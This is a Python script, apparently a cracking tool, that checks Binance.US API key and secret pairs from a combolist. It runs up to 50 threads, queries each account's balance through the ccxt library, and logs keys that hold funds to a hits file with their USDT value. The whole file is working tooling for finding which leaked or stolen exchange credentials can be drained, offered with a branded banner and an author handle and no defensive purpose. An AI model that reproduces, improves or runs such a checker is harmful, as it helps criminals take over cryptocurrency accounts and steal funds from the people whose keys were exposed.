import os
import threading
import ctypes
import time
import easygui
import ccxt
import requests
from colorama import Fore, init

def center(var, space=None):
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) // 2

    return "\n".join((' ' * int(space)) + var for var in var.splitlines())


class BiUS:
    def __init__(self):
        init()
        self.combos = []
        self.lock = threading.Lock()
        self.hits = 0
        self.bad = 0
        self.error = 0

    def ui(self):
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW('[BinUS API Balance Checker - Made by R3DActual#6969]')
        text = '''
                    ▄▄▄▄    ██▓ ███▄    █     █    ██   ██████ 
                    ▓█████▄ ▓██▒ ██ ▀█   █     ██  ▓██▒▒██    ▒ 
                    ▒██▒ ▄██▒██▒▓██  ▀█ ██▒   ▓██  ▒██░░ ▓██▄   
                    ▒██░█▀  ░██░▓██▒  ▐▌██▒   ▓▓█  ░██░  ▒   ██▒
                    ░▓█  ▀█▓░██░▒██░   ▓██░   ▒▒█████▓ ▒██████▒▒
                    ░▒▓███▀▒░▓  ░ ▒░   ▒ ▒    ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
                    ▒░▒   ░  ▒ ░░ ░░   ░ ▒░   ░░▒░ ░ ░ ░ ░▒  ░ ░
                    ░    ░  ▒ ░   ░   ░ ░     ░░░ ░ ░ ░  ░  ░  
                    ░       ░           ░       ░           ░  
                        ░                                     '''
        faded = ''
        red = 40
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(center(faded))

    def update_title(self):
        while True:
            elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
            ctypes.windll.kernel32.SetConsoleTitleW(
                f'[BinUS API Balance Checker - Made by R3DActual#6969] - Hits: {self.hits} | Invalids: {self.bad} | Errors: {self.error} | Threads: {self.hits+self.bad+self.error}/{len(self.combos)} | Time elapsed: {elapsed}')
            time.sleep(0.4)

    def get_combos(self):
        try:
            print(f'[{Fore.CYAN}>{Fore.LIGHTWHITE_EX}] Path to API Key Combolist(API:SECRET)> ')
            path = easygui.fileopenbox(default='*.txt',
                                       filetypes=['*.txt'],
                                       title='BinUS API Balance Checker - Select API Key Combo(API:SECRET)',
                                       multiple=False)
            with open(path, 'r', encoding="utf-8") as f:
                self.combos = [line.strip() for line in f]
        except:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to open combofile')
            os.system('pause >nul')
            quit()

    def checker(self, api_key, api_secret):
        try:
            bius = ccxt.binanceus({
                'enableRateLimit': True,
                'apiKey': api_key,
                'secret': api_secret
            })
            bal = bius.fetch_balance()
            tickers = bius.fetch_tickers()
            destination_code = 'USDT'
            total_destination_value = 0
            for code, amount in bal['total'].items():
                symbol = code + '/' + destination_code
                ticker = tickers.get(symbol, None)
                if ticker is not None:
                    if amount != 0:
                        valuation = amount * ticker['last']
                        total_destination_value += valuation
            if total_destination_value != 0:
                with self.lock:
                    print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] {Fore.MAGENTA}HIT{Fore.RESET} | {api_key} | {api_secret} | ${total_destination_value}')
                    self.hits += 1
                    with open('hits.txt', 'a', encoding='utf-8') as fp:
                        fp.writelines(f'{api_key}:{api_secret} | Total: ${total_destination_value}\n')
            else:
                with self.lock:
                    self.bad += 1
                    with open('bads.txt', 'a', encoding='utf-8') as fp:
                        fp.writelines(f'{api_key}:{api_secret}\n')
        except:
            with self.lock:
                self.error += 1
                with open('invalids.txt', 'a', encoding='utf-8') as fp:
                    fp.writelines(f'{api_key}:{api_secret}\n')

    def worker(self, combos, thread_id):
        while self.check[thread_id] < len(combos):
            combination = combos[self.check[thread_id]].split(':')
            self.checker(combination[0], combination[1])
            self.check[thread_id] += 1

    def main(self):
        self.get_combos()
        try:
            self.threadcount = int(input(f'[{Fore.CYAN}>{Fore.RESET}] Threads> '))
            if self.threadcount < 1 or self.threadcount > 50:
                raise ValueError
        except ValueError:
            print(f'[{Fore.RED}!{Fore.RESET}] Value must be an integer between 1-50')
            os.system('pause >nul')
            quit()

        self.ui()
        self.start = time.time()
        threading.Thread(target=self.update_title, daemon=True).start()

        threads = []
        self.check = [0 for _ in range(self.threadcount)]
        for i in range(self.threadcount):
            sliced_combo = self.combos[int(len(self.combos) / self.threadcount * i): int(len(self.combos) / self.threadcount * (i + 1))]
            t = threading.Thread(target=self.worker, args=(sliced_combo, i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed')
        os.system('pause>nul')


n = BiUS()
n.main()